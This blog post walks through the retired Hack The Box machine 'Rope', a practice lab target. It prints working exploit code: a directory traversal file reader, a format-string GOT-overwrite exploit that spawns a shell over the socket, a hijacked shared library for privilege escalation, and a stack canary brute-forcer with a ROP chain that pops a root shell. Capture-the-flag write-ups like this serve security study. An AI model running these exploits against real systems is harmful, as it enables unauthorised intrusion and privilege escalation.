---
layout: post
title: "Rope: Hack The Box Walkthrough"
date: 2020-05-23 15:33:46 +0000
last_modified_at: 2020-05-23 15:33:46 +0000
category: Walkthrough
tags: ["Hack The Box", Rope, retired, Linux, Insane]
comments: true
image:
  feature: rope-htb-walkthrough.jpg
  credit: corinna-kr / Pixabay
  creditlink: https://pixabay.com/photos/rope-dew-leash-woven-knitting-938034/
---

This post documents the complete walkthrough of Rope, a retired vulnerable [VM][1] created by [R4J][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Rope is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.148 --rate=700

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-08-04 09:26:00 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.148                                    
Discovered open port 9999/tcp on 10.10.10.148
```

Hmm. `9999/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,9999 -A --reason -oN nmap.txt 10.10.10.148
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 56:84:89:b6:8f:0a:73:71:7f:b3:dc:31:45:59:0e:2e (RSA)
|   256 76:43:79:bc:d7:cd:c7:c7:03:94:09:ab:1f:b7:b8:2e (ECDSA)
|_  256 b3:7d:1c:27:3a:c1:78:9d:aa:11:f7:c6:50:57:25:5e (ED25519)
9999/tcp open  abyss?  syn-ack ttl 63
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache
|     Content-length: 4871
|     Content-type: text/html
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <title>Login V10</title>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <!--===============================================================================================-->
|     <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
|     <!--===============================================================================================-->
|     <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
|     <!--===============================================================================================-->
|     <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
|_    <!--===============================================
```

OK. `9999/tcp` is some kind of `http` service. This is what it looks like.

{% include image.html image_alt="bf3824a9.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/bf3824a9.png" %}

### Directory Traversal

The site is vulnerable to directory traversal attack. The following is a selected output from `dotdotpwn`.

{% include image.html image_alt="34db590c.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/34db590c.png" %}

Seeing is believing. Armed with this insight, I can probably write a `bash` script to read any file, where I have permission, from the machine.

<div class="filename"><span>read.sh</span></div>

~~~~bash
#!/bin/bash

HOST=10.10.10.148
PORT=9999
PAYLOAD="${1//\/%2f/}"

OUT=$(curl -s \
           "http://$HOST:$PORT/..%2f..$PAYLOAD")

if grep -E '^<' <<<"$OUT" &>/dev/null; then
  echo $OUT \
  | html2text
else
  echo "$OUT"
fi
~~~~

Let's give it a shot.

{% include image.html image_alt="d33ae72f.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/d33ae72f.png" %}

Sweet. I can read directories as well. :wink:

{% include image.html image_alt="0a46bc45.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/0a46bc45.png" %}

### Catching an ELF

Now that we have the capability to read files off the server, we can also read the ELF executable that's running the vulnerable web server.

```
# ./read.sh /proc/self/exe > httpserver
# file httpserver
rope: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e4e105bd11d096b41b365fa5c0429788f2dd73c3, not stripped
# md5sum httpserver
4c355fdab9cab351b624a08309848e31  httpserver
```

Looks like someone submitted it to VirusTotal. :laughing:

{% include image.html image_alt="65ecf1ba.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/65ecf1ba.png" %}

Since we can read directories as well, the document root is at `/opt/www`.

{% include image.html image_alt="88d48dac.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/88d48dac.png" %}

And here's where `httpserver` is ran from.

```
# ./read.sh /opt/www/run.sh
#!/bin/bash
source /home/john/.bashrc
while true;
do cd /opt/www;
./httpserver;
done
```

### Vulnerability Analysis of `httpserver`

I already know the remote machine is Ubuntu 18.04.2, which by default, has several protection mechanisms, e.g. stack canary, ASLR/NX and PIE, against exploits. Let's confirm that with PEDA.

{% include image.html image_alt="29fc6a50.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/29fc6a50.png" %}

Yep, it's protected alright. By the way, I found the [source](https://github.com/shenfeng/tiny-web-server) code which `httpserver` was based on, which goes a long way in helping us reverse-engineer `httpserver`.

The creator of this box has changed a few things. For one, the `http_request` struct is now like this:

```c
typedef struct {
    char filename[1024];
    char method[1024]
    off_t offset;
    size_t end;
} http_request;
```

Long story short, there's a format string vulnerability in the `log_access` function of `httpserver`.

{% include image.html image_alt="e1480f04.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/e1480f04.png" %}

You can see that `httpserver` prints the filename from the `http_request` struct without any format string.

By way of demonstration, we can read data off the stack like so.

```
# curl 127.0.0.1:9999/AAAABBBB$(perl -e 'print "%2508x." x 100')
```

{% include image.html image_alt="ab1ab2db.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/ab1ab2db.png" %}

The offset to 41414141 (`AAAA`) and 42424242 (`BBBB`) is 53 and 54 respectively. Any strings prepended in front of `AAAA`, in multiples of 4, increase the offset by `strlen/4.`. For example, if a string, 40 characters long is prepended to `AAAA`, the offset to `AAAA` is `53 + (40/4)`, or 63.

Now that we know the offset to control the memory address, and the number of bytes written by `printf`, we can make use of pwntools' `fmtstr_payload `to generate a format string payload.

Where do we write and what do we write?

{% include image.html image_alt="a8a641f9.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/a8a641f9.png" %}

The first function we encounter after the format string vulnerability is `puts`. However, the argument pushed to the stack is an empty string. Even if we rewrite the memory address of `puts` to `system`, it won't do us any good. Well, we can rewrite `puts` to `<log_access+110>`, which is the memory address of `mov eax, [ebp+req]` shown above. And, we can rewrite `printf` to `system` because the argument is the filename member of `http_request` struct, which is something we control. Perfect.

...

Not only can we read the `httpserver` executable, we can also read the memory map of the executable using the `Range` header. Here's a rewritten `read.sh`.

~~~~bash
#!/bin/bash

HOST=10.10.10.148
PORT=9999
PAYLOAD=$1
TEMP=$(mktemp -u)
RANGE="Range: bytes=0-$((1024*1024))"

function clean() {
    rm -rf $TEMP
}

if [ "$PAYLOAD" == "-r" ]; then
    PAYLOAD=$2
    curl -s \
         -o $TEMP \
         -H "$RANGE" \
         "http://$HOST:$PORT/$PAYLOAD"
else
    curl -s \
         -o $TEMP \
         "http://$HOST:$PORT/$PAYLOAD"
fi

if cat $TEMP | grep -Ea '^<' &>/dev/null; then
    cat $TEMP | html2text && clean
else
    cat $TEMP && clean
fi
~~~~

See? Memory address leak.

{% include image.html image_alt="f11c0aeb.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/f11c0aeb.png" %}

Last but not least, we need to locate the offsets of `puts`, `printf`, `system` and `<log_access+110>`. Combined with the base memory address leak of `httpserver` and `libc`, we now know where and what to overwrite.

***`printf` and `puts` offsets in `httpserver`***

{% include image.html image_alt="fbac5210.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/fbac5210.png" %}

***`<log_access+110>` offset in `httpserver`***

{% include image.html image_alt="0523c084.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/0523c084.png" %}

***`_system` offset in `libc`***

{% include image.html image_alt="ee64c2c9.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/ee64c2c9.png" %}

Armed with these insights, we can now write our exploit.

<div class="filename"><span>exploit.py</span></div>

~~~~python
from pwn import *
from urllib import quote

context.clear(arch="i386")

maps = '''\
GET //proc/self/maps HTTP/1.1
Range: bytes=0-{}

'''.format(str(1024*1024))

r = remote("10.10.10.148", 9999)
r.send(maps)

info("Getting /proc/self/maps")

httpserver = None
libc = None

while True:
    try:
        line = r.recvline()
    except EOFError:
        break
    if httpserver is None and "httpserver" in line:
        httpserver = int(line[:8], 16)
    if libc is None and "libc" in line:
        libc = int(line[:8], 16)

success("Found: %s (httpserver)", hex(httpserver))
success("Found: %s (libc)", hex(libc))

r.close()

goto   = 0x20e5 + httpserver # <log_access+110>
puts   = 0x5048 + httpserver # puts in got.plt (writable)
printf = 0x5018 + httpserver # printf in got.plt (writable)
system = 0x3cd10 + libc      # system@libc

writes = {
    printf : system,
    puts : goto
}

shell = 'bash -c "exec <&4 >&4; sh" #'
info("Executing shell: %s", repr(shell))

pad = len(shell) % 4
if pad:
    shell += ' ' * (4 - pad)

offset = (len(shell) / 4) + 53
payload = shell + fmtstr_payload(offset, writes, len(shell), write_size='short')

request='''\
GET /{} HTTP/1.1

'''.format(quote(payload))

r = remote("10.10.10.148", 9999)
r.send(request)
r.recvuntil("HTTP", drop=True)
r.clean()

success("We have shell!")

r.interactive()
~~~~

Let's do this.

{% include image.html image_alt="3b50aeeb.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/3b50aeeb.png" %}

We got shell!

## Low-Privilege Shell

We can write a SSH public key we control to `/home/john/.ssh/authorized_keys` since SSH is available. That gives us a more stable shell.

{% include image.html image_alt="c98523d0.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/c98523d0.png" %}

Bam. So much for a low-privileged shell. Notice that we haven't even gotten `user.txt`?

### Getting `user.txt`

The `user.txt` must be at `r4j`'s home directory. Why do I say that? Well, `john` has an uid of `1001` and the file is not here. It must at `r4j`, who has a uid of `1000`. Furthermore, check out the `sudo` policy on `john`.

{% include image.html image_alt="cbf9d20d.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/cbf9d20d.png" %}

`john` is able to run `/usr/bin/readlogs` as `r4j`. Something funky must be going on there. The binary imports the `printlog` function from `liblog.so`.

{% include image.html image_alt="5a0f55bc.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/5a0f55bc.png" %}

I knew it.

{% include image.html image_alt="85d9ce44.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/85d9ce44.png" %}

I guess anyone can write a **fake** `liblog.so` with a `printlog` function that does something nefarious than just `tail`'ing off the last 10 lines of `/var/log/auth.log`. :wink:

<div class="filename"><span>test.c</span></div>

~~~~c
#include <stdlib.h>
#include <unistd.h>

void printlog() {
        setuid(1000);
        setgid(1000);
        system("bash -i");
}
~~~~

Let's compile the code above into a shared library and see what goes.

{% include image.html image_alt="44f1395a.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/44f1395a.png" %}

Sweet. We can repeat the trick of planting a SSH public key we controlled into `/home/r4j/.ssh/authorized_keys`. As expected, `user.txt` is at `r4j`'s home directory.

{% include image.html image_alt="6ef0c517.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/6ef0c517.png" %}

## Privilege Escalation

During enumeration of `r4j`'s account, I found an executable (`/opt/support/contact`) that allows one to send a message to `admin`, which I guess, is another way of saying `root`. The executable is ran from `cron` under `root`'s permission and accepts request at `127.0.0.1:1337`.

There's something special about `contact`. The debug symbols are stripped, which means that I can't even disassemble the `main` function.

{% include image.html image_alt="5073e2cd.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/5073e2cd.png" %}

See? Even `gdb` don't know where to find the address of `main`.

{% include image.html image_alt="a7c9fd70.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/a7c9fd70.png" %}

There's an easy fix to this problem.

### Locating the `main` function of `contact`

First, we check out the file information with `gdb`.

{% include image.html image_alt="f4c0fac7.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/f4c0fac7.png" %}

Using `gdb`, we can place a breakpoint at `0x0` and run the file.

{% include image.html image_alt="b6976c5a.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/b6976c5a.png" %}

The program suspends and goes into the background. Look what happens when we bring the program back into the foreground with `fg`.

{% include image.html image_alt="f66dd09a.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/f66dd09a.png" %}

Of course, GDB will complain that it can't place the breakpoint. But when we run `info file` again, the entry point of `contact` gets resolved automagically.

{% include image.html image_alt="96fe9ae8.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/96fe9ae8.png" %}

We placed a second breakpoint at this entry point and delete the first breakpoint. We then try to `run` the file again.

{% include image.html image_alt="03e26a75.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/03e26a75.png" %}

Several instructions down, we will encounter the address of `main`. It's the argument to `__libc_start_main`.

{% include image.html image_alt="3f7c3128.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/3f7c3128.png" %}

We'll place a breakpoint at `0x55555555540e`, delete the second breakpoint, and then `run` the file again.

{% include image.html image_alt="8f47b3e5.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/8f47b3e5.png" %}

Woohoo. We are now in the territory of `main`. Time to proceed to reverse engineering.

### Vulnerability Analysis of `contact`

I've done my reverse engineering of `contact`. Once `contact` `call`s the `parse_message` function. The return address (`0x1562`) is pushed onto the stack.

{% include image.html image_alt="863c50d7.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/863c50d7.png" %}

What happens next once we stepped into `parse_message` is that RBP and the stack canary is saved onto the stack before invoking `recv` on the socket.

{% include image.html image_alt="84fe1761.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/84fe1761.png" %}

Like I said in the comment of the `parse_message` function, `buf` is 56 bytes in size. We can, however overwrite up to 1024 bytes. :wink:

Let's see this in action in `gdb`.

{% include image.html image_alt="3d61bb5d.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/3d61bb5d.png" %}

### Exploit Development of `contact`

Armed with this insight, we can proceed to develop our exploit. Here's the game plan:

1. Brute-force the stack canary and return address.
2. Use ROP gadgets to leak `write@libc` address in `write@got`.
3. Pop a shell and `dup2` `stdin`, `stdout`, and `stderr` to socket.
4. Transfer statically compiled `socat` to the remote machine
5. Create a tunnel between `127.0.0.1:1337` and `10.10.10.148:31337` with `socat`.

With that in mind, here's the exploit code I've written.

<div class="filename"><span>exploit2.py</span></div>

~~~~python
from pwn import *

def brute(msg, host, port, type=""):

    if (type == "stack"):
        desc = "Stack cookie"
        brute = "\x00"
        length = 8

    elif (type == "base"):
        desc = "Base pointer"
        brute = ""
        length = 6

    elif (type == "retaddr"):
        desc = "Return address"
        brute = "\x62"
        length = 6

    info("%s brute force started..." % desc)
    context.log_level = "error"

    for byte in range(len(brute), length):
        for value in range(256):
            while 1:
                try:
                    io = remote(host, port)
                    break
                except:
                    print("[!] Connection attempt failed. New attempt in 1 second...")
                time.sleep(1)

            io.clean()
            io.send(msg + brute + pack(value, 8))
            response = ""
            try:
                response = io.recvuntil("Done.")
            except EOFError:
                pass
            finally:
                io.shutdown()
                io.close()
            if "Done." in response: # correct guess
                brute += pack(value, 8)
                print("[+] [%s] = %s" % (str(byte), hex(value)))
                break

    context.log_level = "info"

    if type != "stack":
    	brute += "\x00\x00"

    brute = u64(brute)
    info("%s is %s" % (desc, hex(brute)))
    return brute

# front matter
host = "10.10.10.148"
port = 31337

# brute-force stack canary
junk            = 'A' * 56
stack_canary    = brute(junk, host, port, type="stack")
base_ptr        = brute(junk + p64(stack_canary), host, port, type="base")
ret_addr        = brute(junk + p64(stack_canary) + p64(base_ptr), host, port, type="retaddr")

# load target
contact   = ELF('./contact')
contact.address = ret_addr - 0x1562 # offset to return address

# ROPgadget --binary contact
pop_rdi_ret     = contact.address + 0x164b
pop_rdx_ret     = contact.address + 0x1265
pop_rsi_pop_ret = contact.address + 0x1649
ret             = contact.address + 0x1016
skip            = 0xdeadbeef

# leak write@libc address in GOT
payload  = ''
payload += junk
payload += p64(stack_canary)
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(pop_rsi_pop_ret)
payload += p64(contact.got["write"])
payload += p64(skip)
payload += p64(pop_rdx_ret)
payload += p64(16)
payload += p64(contact.plt["write"])

r = remote(host, port)
r.recvuntil("admin:\n")
r.send(payload)

# libc base address
# offset to write@libc. change for other versions
# base = u64(r.recv(8)) - 0xea4f0  # my libc
base = u64(r.recv(8)) - 0x110140  # rope's libc
r.shutdown()
r.close()

success("Found libc base address @ %s" % hex(base))

# load libc
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # my libc
libc = ELF('./libc.so.6') # rope's libc
libc.address = base

# pop a shell
# dup2(4, 0); dup2(4, 1); dup2(4, 2); system("/bin/sh")
payload  = ''
payload += junk
payload += p64(stack_canary)
payload += p64(base_ptr)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(pop_rsi_pop_ret)
payload += p64(0)
payload += p64(skip)
payload += p64(libc.symbols["dup2"])
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(pop_rsi_pop_ret)
payload += p64(1)
payload += p64(skip)
payload += p64(libc.symbols["dup2"])
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(pop_rsi_pop_ret)
payload += p64(2)
payload += p64(skip)
payload += p64(libc.symbols["dup2"])
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(libc.symbols["system"])

r = remote(host, port)
r.recvuntil("admin:\n")
r.send(payload)

success("We got shell!")
r.interactive()
~~~~

The statically compiled socat can be obtained [here](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64). And this is the command to create a tunnel between `127.0.0.1:1337` and `10.10.10.148:31337` with `socat`.

```
r4j@rope:/tmp$ ./socat tcp-listen:31337,fork tcp:127.0.0.1:1337 &
```

### Getting `root.txt`

All that's left is to run the exploit and with a liitle bit of luck that no one resets the machine while you are brute-forcing the stack canary, base pointer and return address, you should get something like this.

{% include image.html image_alt="8ea59f11.png" image_src="/b257ffe0-a524-4c2e-9270-99674181d9c2/8ea59f11.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/200
[2]: https://www.hackthebox.eu/home/users/profile/13243
[3]: https://www.hackthebox.eu/
